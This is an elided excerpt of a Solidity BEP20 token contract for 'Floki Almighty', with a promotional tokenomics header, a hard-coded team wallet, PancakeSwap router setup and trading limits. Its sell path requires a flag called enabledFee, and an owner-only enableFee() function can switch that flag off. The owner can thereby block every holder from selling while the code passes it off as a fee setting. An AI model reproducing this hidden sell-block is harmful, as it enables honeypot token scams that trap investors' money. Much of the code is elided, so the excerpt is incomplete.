...
/*
    ...
    Token Name : Floki Almighty
    Token Symbol : FlokiAlmighty
    Total Supply : 10_000_000_000 (TEN BILLION)
    Initial Liquidity : TBA (0.5 - 2BNB)
    Max Wallet: 3% (300_000_000)

    🌀 DYNAMIC TAX : 5%
    🧑💻2% for the Marketing
    ✅3% Auto LP
    
    TG: https://t.me/flokialmighty
...
contract FlokiAlmighty is IBEP20, Ownable
{
    ...
    string private constant _name = 'Floki Almighty';
    string private constant _symbol = 'FlokiAlmighty';
    uint8 private constant _decimals = 8;
    uint256 public constant InitialSupply=  10_000_000_000 * 10**_decimals;
    ...
    address public constant TeamWallet=0x77b19bF4b3918Edcb3643D8F77aC37E85Aa412a3;
    address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    bool enabledFee = true;

    uint256 private _circulatingSupply =InitialSupply;
    uint256 public  balanceLimit = 300_000_000 * 10**_decimals;
    uint256 public  sellLimit = 300_000_000 * 10**_decimals;
    uint256 public  buyLimit = 300_000_000 * 10**_decimals;
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        if(isSell){
            ...
            require(enabledFee, "Transfer With Fee");
   ...
   function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
    ...
    function enableFee(bool enabled) public authorized{
        enabledFee=enabled;
    }
